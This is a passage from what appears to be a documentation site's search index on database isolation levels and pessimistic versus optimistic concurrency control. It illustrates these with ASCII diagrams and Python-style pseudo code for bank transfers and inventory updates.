False\n\n\n# Handling serialization failures\ndef serializable_with_retry(db, operation, max_retries=3):\n    \"\"\"SERIALIZABLE transactions may fail - implement retry logic\"\"\"\n    for attempt in range(max_retries):\n        try:\n            db.set_isolation_level(\"SERIALIZABLE\")\n            db.begin()\n\n            result = operation(db)\n\n            db.commit()\n            return result\n\n        except SerializationError as e:\n            # Transaction was aborted due to serialization conflict\n            db.rollback()\n\n            if attempt &lt; max_retries - 1:\n                # Exponential backoff\n                sleep_time = (2 ** attempt) * 0.1\n                time.sleep(sleep_time)\n                print(f\"Retry attempt {attempt + 1}\")\n            else:\n                raise\n\n        except Exception as e:\n            db.rollback()\n            raise\n\n\n# Implementation methods vary by database\ndef serializable_implementation_comparison():\n    \"\"\"Different databases implement SERIALIZABLE differently\"\"\"\n\n    # PostgreSQL: Serializable Snapshot Isolation (SSI)\n    # - Uses MVCC + conflict detection\n    # - Transactions may be aborted\n    # - Better performance than locking\n\n    # MySQL InnoDB: Next-key locking\n    # - Locks rows + gaps between rows\n    # - Prevents phantoms via gap locks\n    # - More blocking, fewer aborts\n\n    # SQL Server: Range locks\n    # - Locks key ranges\n    # - Prevents phantoms\n    # - Similar to MySQL\n\n    # Oracle: Not true SERIALIZABLE\n    # - \"SERIALIZABLE\" is actually snapshot isolation\n    # - Still allows write skew anomalies\n    # - Use \"FOR UPDATE\" for true serializability\n\n    pass\n</code></pre> <p>Comparison Table:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         Isolation Level Comparison                           \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                              \u2502\n\u2502 Level              Dirty  Non-Rep  Phantom  Concurrency      \u2502\n\u2502                    Read   Read     Read     Level            \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Read Uncommitted   YES    YES      YES     \u2605\u2605\u2605\u2605\u2605 (highest)  \u2502\n\u2502 Read Committed     NO     YES      YES     \u2605\u2605\u2605\u2605\u2606            \u2502\n\u2502 Repeatable Read    NO     NO       YES     \u2605\u2605\u2605\u2606\u2606            \u2502\n\u2502 Serializable       NO     NO       NO      \u2605\u2605\u2606\u2606\u2606 (lowest)   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                              \u2502\n\u2502 Performance Impact:                                          \u2502\n\u2502 Read Uncommitted:  Fastest (no locks)                        \u2502\n\u2502 Read Committed:    Fast (short locks)                        \u2502\n\u2502 Repeatable Read:   Moderate (longer locks)                   \u2502\n\u2502 Serializable:      Slowest (longest locks/most conflicts)    \u2502\n\u2502                                                              \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Advantages: - \u2705 Complete isolation - no anomalies possible - \u2705 Perfect consistency - as if transactions run serially - \u2705 No dirty/non-repeatable/phantom reads - \u2705 Simplest programming model - no concurrency issues to handle - \u2705 Required for critical operations - financial, inventory</p> <p>Disadvantages: - \u274c Lowest concurrency - significant blocking - \u274c Worst performance - many transactions wait - \u274c Deadlocks common - transactions waiting on each other - \u274c Serialization failures - transactions may be aborted - \u274c Not scalable - limits throughput</p> <p>When to Use: - Critical financial transactions (money transfers, payments) - Inventory management (prevent overselling) - Compliance and auditing (exact counts required) - When data accuracy is more important than performance - Small transactions with low contention</p>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#summary-choosing-the-right-isolation-level","title":"Summary: Choosing the Right Isolation Level","text":"<pre><code>def choose_isolation_level(use_case):\n    \"\"\"Guide for choosing isolation level\"\"\"\n\n    if use_case == \"dashboard_analytics\":\n        # Approximate data OK, maximum performance\n        return \"READ UNCOMMITTED\"\n\n    elif use_case == \"web_application\":\n        # Standard OLTP, dirty reads not acceptable\n        return \"READ COMMITTED\"  # Most common choice\n\n    elif use_case == \"complex_calculation\":\n        # Need consistent row values, OK if counts change\n        return \"REPEATABLE READ\"\n\n    elif use_case == \"financial_transaction\":\n        # Perfect accuracy required, performance secondary\n        return \"SERIALIZABLE\"\n\n    elif use_case == \"reporting\":\n        # Depends on accuracy requirements\n        if accuracy == \"approximate\":\n            return \"READ UNCOMMITTED\"\n        elif accuracy == \"exact_values\":\n            return \"REPEATABLE READ\"\n        elif accuracy == \"exact_counts\":\n            return \"SERIALIZABLE\"\n\n    # Default safe choice\n    return \"READ COMMITTED\"\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#4-optimistic-vs-pessimistic-concurrency-control","title":"4. Optimistic vs Pessimistic Concurrency Control","text":"<p>Description:</p> <p>Concurrency control mechanisms can be broadly categorized into two fundamental approaches: Pessimistic Concurrency Control and Optimistic Concurrency Control. These represent two different philosophies for handling concurrent access to data.</p>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#41-pessimistic-concurrency-control","title":"4.1 Pessimistic Concurrency Control","text":"<p>Description:</p> <p>Pessimistic Concurrency Control assumes that conflicts are likely to occur when multiple transactions access the same data concurrently. Therefore, it prevents conflicts before they happen by acquiring locks on data before accessing it. This is the \"better safe than sorry\" approach.</p> <p>Core Philosophy:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502     PESSIMISTIC CONCURRENCY CONTROL - Philosophy        \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502  Assumption: \"Conflicts WILL happen frequently\"         \u2502\n\u2502                                                         \u2502\n\u2502  Strategy: PREVENT conflicts by locking                 \u2502\n\u2502                                                         \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510        \u2502\n\u2502  \u2502 1. Lock resources BEFORE accessing         \u2502        \u2502\n\u2502  \u2502 2. Hold locks during entire transaction    \u2502        \u2502\n\u2502  \u2502 3. Block other transactions from accessing \u2502        \u2502\n\u2502  \u2502 4. Release locks on commit/rollback        \u2502        \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518        \u2502\n\u2502                                                         \u2502\n\u2502  Metaphor: \"Lock the door before entering the room\"    \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>How Pessimistic Control Works:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502        PESSIMISTIC CONCURRENCY CONTROL - Flow           \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502  Transaction Lifecycle:                                 \u2502\n\u2502                                                         \u2502\n\u2502  1. BEGIN TRANSACTION                                   \u2502\n\u2502     \u2193                                                   \u2502\n\u2502  2. ACQUIRE LOCKS (Shared or Exclusive)                 \u2502\n\u2502     \u251c\u2500 Lock acquired? \u2192 Proceed                        \u2502\n\u2502     \u2514\u2500 Lock held by others? \u2192 WAIT (BLOCKED)           \u2502\n\u2502     \u2193                                                   \u2502\n\u2502  3. READ/WRITE DATA                                     \u2502\n\u2502     - Guaranteed exclusive or shared access             \u2502\n\u2502     - No one can interfere                              \u2502\n\u2502     \u2193                                                   \u2502\n\u2502  4. HOLD LOCKS (until transaction ends)                 \u2502\n\u2502     \u2193                                                   \u2502\n\u2502  5. COMMIT or ROLLBACK                                  \u2502\n\u2502     \u2193                                                   \u2502\n\u2502  6. RELEASE LOCKS                                       \u2502\n\u2502     - Other transactions can now proceed                \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Visual Timeline Example:</p> <pre><code>Pessimistic Locking Timeline:\n\nTime  T1 (Pessimistic)           Locks         T2 (Pessimistic)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nt1    BEGIN                       -             \nt2    LOCK row (FOR UPDATE)       \ud83d\udd12 Row locked\nt3    Read row: balance=1000      \ud83d\udd12 Locked    \nt4                                              BEGIN\nt5                                              LOCK same row\nt6                                              \u274c BLOCKED!\nt7    Modify: balance=500         \ud83d\udd12 Locked     [Waiting...]\nt8    (business logic...)         \ud83d\udd12 Locked     [Waiting...]\nt9    COMMIT                      \ud83d\udd13 Unlocked  \nt10                                             \u2713 Lock acquired\nt11                                             Read: balance=500\nt12                                             COMMIT\n\nResult: T2 WAITED for T1 to finish (prevented conflict)\n</code></pre> <p>Implementation Approaches:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    PESSIMISTIC CONTROL - Implementation Types           \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 1. Two-Phase Locking (2PL)                              \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Growing Phase: Acquire locks only        \u2502         \u2502\n\u2502 \u2502 \u2022 Shrinking Phase: Release locks only      \u2502         \u2502\n\u2502 \u2502 \u2022 No lock acquisition after first release  \u2502         \u2502\n\u2502 \u2502 \u2022 Guarantees serializability               \u2502         \u2502\n\u2502 \u2502 \u2022 Used by: SQL Server, DB2                 \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 2. Strict Two-Phase Locking (Strict 2PL)               \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Holds ALL locks until COMMIT/ROLLBACK    \u2502         \u2502\n\u2502 \u2502 \u2022 No shrinking phase during transaction    \u2502         \u2502\n\u2502 \u2502 \u2022 Prevents cascading rollbacks             \u2502         \u2502\n\u2502 \u2502 \u2022 Most common in practice                  \u2502         \u2502\n\u2502 \u2502 \u2022 Used by: Most SQL databases              \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 3. Explicit Locking                                     \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 SELECT ... FOR UPDATE                    \u2502         \u2502\n\u2502 \u2502 \u2022 SELECT ... LOCK IN SHARE MODE            \u2502         \u2502\n\u2502 \u2502 \u2022 LOCK TABLE ...                           \u2502         \u2502\n\u2502 \u2502 \u2022 Application controls lock granularity    \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Pseudo Code Examples:</p> <pre><code># Example 1: Basic Pessimistic Locking (SELECT FOR UPDATE)\n\ndef pessimistic_transfer(db, from_account, to_account, amount):\n    \"\"\"Bank transfer with pessimistic locking\"\"\"\n    db.begin()\n\n    try:\n        # LOCK rows immediately with SELECT FOR UPDATE\n        # This acquires exclusive locks, blocking other transactions\n        from_balance = db.execute(\"\"\"\n            SELECT balance FROM accounts \n            WHERE id = ? \n            FOR UPDATE\n        \"\"\", [from_account]).fetchone()[0]\n\n        # Lock acquired! No one else can read/modify this row\n        # until we commit/rollback\n\n        to_balance = db.execute(\"\"\"\n            SELECT balance FROM accounts \n            WHERE id = ? \n            FOR UPDATE\n        \"\"\", [to_account]).fetchone()[0]\n\n        # Validate sufficient funds\n        if from_balance &lt; amount:\n            raise InsufficientFundsError()\n\n        # Perform updates (locks already held)\n        db.execute(\"\"\"\n            UPDATE accounts SET balance = balance - ? \n            WHERE id = ?\n        \"\"\", [amount, from_account])\n\n        db.execute(\"\"\"\n            UPDATE accounts SET balance = balance + ? \n            WHERE id = ?\n        \"\"\", [amount, to_account])\n\n        db.commit()  # Release locks\n        return True\n\n    except Exception as e:\n        db.rollback()  # Release locks\n        return False\n\n\n# Example 2: Pessimistic Read-Modify-Write\n\ndef pessimistic_inventory_update(db, product_id, quantity_to_reserve):\n    \"\"\"Reserve inventory with pessimistic locking\"\"\"\n    db.begin()\n\n    try:\n        # Lock inventory row\n        current_stock = db.execute(\"\"\"\n            SELECT quantity FROM inventory \n            WHERE product_id = ? \n            FOR UPDATE\n        \"\"\", [product_id]).fetchone()[0]\n\n        # Row is now locked - no concurrent modifications possible\n\n        if current_stock &lt; quantity_to_reserve:\n            raise OutOfStockError()\n\n        # Update inventory\n        db.execute(\"\"\"\n            UPDATE inventory \n            SET quantity = quantity - ? \n            WHERE product_id = ?\n        \"\"\", [quantity_to_reserve, product_id])\n\n        # Create reservation record\n        db.execute(\"\"\"\n            INSERT INTO reservations (product_id, quantity, timestamp)\n            VALUES (?, ?, ?)\n        \"\"\", [product_id, quantity_to_reserve, now()])\n\n        db.commit()\n        return True\n\n    except Exception as e:\n        db.rollback()\n        return False\n\n\n# Example 3: Shared Lock (Multiple Readers)\n\ndef pessimistic_shared_read(db, account_id):\n    \"\"\"Read with shared lock - allows concurrent reads\"\"\"\n    db.begin()\n\n    # Acquire shared lock\n    balance = db.execute(\"\"\"\n        SELECT balance FROM accounts \n        WHERE id = ? \n        LOCK IN SHARE MODE\n    \"\"\", [account_id]).fetchone()[0]\n\n    # Other transactions can:\n    # - Read with LOCK IN SHARE MODE \u2713\n    # - Cannot UPDATE (blocked by shared lock) \u2717\n\n    # Perform read-only operations\n    print(f\"Balance: {balance}\")\n\n    db.commit()  # Release shared lock\n</code></pre> <p>Advantages: - \u2705 Prevents conflicts - locks guarantee exclusive/shared access - \u2705 Data consistency - no dirty reads, lost updates, or write conflicts - \u2705 Simple reasoning - if you have the lock, you have exclusive access - \u2705 Suitable for high-contention - prevents wasted work from conflicts</p> <p>Disadvantages: - \u274c Blocking - transactions wait for locks, reduced throughput - \u274c Deadlocks - circular lock dependencies can occur - \u274c Lock overhead - acquiring, holding, and releasing locks costs CPU/memory - \u274c Reduced concurrency - locks prevent parallel execution - \u274c Lock escalation - too many row locks \u2192 table locks (worse performance)</p>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#42-optimistic-concurrency-control","title":"4.2 Optimistic Concurrency Control","text":"<p>Description:</p> <p>Optimistic Concurrency Control assumes that conflicts are rare when multiple transactions access the same data concurrently. Therefore, it allows transactions to proceed without locks and only checks for conflicts at commit time. This is the \"hope for the best, handle problems later\" approach.</p> <p>Core Philosophy:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502     OPTIMISTIC CONCURRENCY CONTROL - Philosophy         \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502  Assumption: \"Conflicts are RARE\"                       \u2502\n\u2502                                                         \u2502\n\u2502  Strategy: DETECT and RESOLVE conflicts at commit       \u2502\n\u2502                                                         \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510        \u2502\n\u2502  \u2502 1. Read data WITHOUT locks                 \u2502        \u2502\n\u2502  \u2502 2. Make changes in isolation (local copy)  \u2502        \u2502\n\u2502  \u2502 3. Validate no conflicts before commit     \u2502        \u2502\n\u2502  \u2502 4. Commit if valid, ABORT if conflict      \u2502        \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518        \u2502\n\u2502                                                         \u2502\n\u2502  Metaphor: \"Walk into the room, check if someone       \u2502\n\u2502             changed things, redo if needed\"             \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>How Optimistic Control Works:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502        OPTIMISTIC CONCURRENCY CONTROL - Flow            \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502  Transaction Lifecycle:                                 \u2502\n\u2502                                                         \u2502\n\u2502  1. BEGIN TRANSACTION                                   \u2502\n\u2502     \u2193                                                   \u2502\n\u2502  2. READ DATA (no locks!)                               \u2502\n\u2502     - Record version number or timestamp                \u2502\n\u2502     - Make local copy                                   \u2502\n\u2502     \u2193                                                   \u2502\n\u2502  3. MODIFY DATA LOCALLY                                 \u2502\n\u2502     - Changes in memory only                            \u2502\n\u2502     - No locks acquired                                 \u2502\n\u2502     - No blocking of other transactions                 \u2502\n\u2502     \u2193                                                   \u2502\n\u2502  4. VALIDATION PHASE (at commit)                        \u2502\n\u2502     - Check if data changed since read                  \u2502\n\u2502     - Compare version numbers or timestamps             \u2502\n\u2502     \u251c\u2500 No changes? \u2192 Proceed to commit                 \u2502\n\u2502     \u2514\u2500 Data changed? \u2192 ABORT and RETRY                 \u2502\n\u2502     \u2193                                                   \u2502\n\u2502  5. COMMIT (if validation passed)                       \u2502\n\u2502     - Apply changes to database                         \u2502\n\u2502     - Increment version number                          \u2502\n\u2502                                                         \u2502\n\u2502  OR                                                     \u2502\n\u2502                                                         \u2502\n\u2502  5. ABORT (if validation failed)                        \u2502\n\u2502     - Discard local changes                             \u2502\n\u2502     - Retry transaction (read fresh data)               \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Visual Timeline Example:</p> <pre><code>Optimistic Concurrency Timeline:\n\nTime  T1 (Optimistic)                    T2 (Optimistic)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nt1    BEGIN                              \nt2    Read: balance=1000, version=1     \nt3    (no locks acquired!)               BEGIN\nt4                                       Read: balance=1000, version=1\nt5    Modify locally: balance=500       \nt6                                       Modify locally: balance=700\nt7    VALIDATE (version still 1?) 